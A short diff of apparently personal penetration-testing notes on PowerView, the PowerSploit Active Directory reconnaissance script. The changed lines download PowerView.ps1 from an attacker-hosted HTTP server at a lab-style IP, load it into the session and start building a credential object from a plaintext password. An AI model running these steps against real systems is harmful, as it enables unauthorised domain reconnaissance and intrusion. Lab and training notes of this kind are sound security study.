@@ -7,10 +7,12 @@ https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
 For functions that enumerate multiple machines, pass the -Verbose flag to get a progress status as each host is enumerated. Most of the "meta" functions accept an array of hosts from the pipeline.
 
 ```powershell
-Invoke-WebRequest -Uri http://10.10.14.9:8000/PowerView.ps1 -OutFile PowerView.ps1
+Invoke-WebRequest -Uri http://10.10.14.8:8000/PowerView.ps1 -OutFile PowerView.ps1
 
 . ./PowerView.ps1
 Import-Module .\PowerView.ps1
+
+menu
 
 //  Create Credential Object
 $passwd = ConvertTo-SecureString "password" -AsPlainText -Force
